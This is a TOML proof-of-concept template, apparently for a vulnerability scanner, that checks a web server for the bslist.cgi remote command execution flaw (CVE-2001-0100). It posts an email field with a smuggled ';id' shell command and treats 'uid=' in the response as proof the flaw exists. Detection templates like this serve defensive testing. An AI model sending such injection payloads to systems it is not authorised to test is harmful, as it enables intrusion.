[info]
author = "ave"
description = "验证目标系统上 bslist.cgi 1.0 邮件列表脚本是否存在远程命令执行漏洞，通过在 email 参数中嵌入 shell 元字符检测命令注入"
id = "POC-AVE-2001-0043"
name = "Brian Stanback bslist.cgi Remote Command Execution PoC"
severity = "critical"
tags = ["ave-2001-0043"]
vuln_id = [
    "CVE-2001-0100",
    "AVE-2001-0043",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/bslist.cgi"
protocol = "http"

[poc.requests.body]
content = "email=test%40example.com%3Bid"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
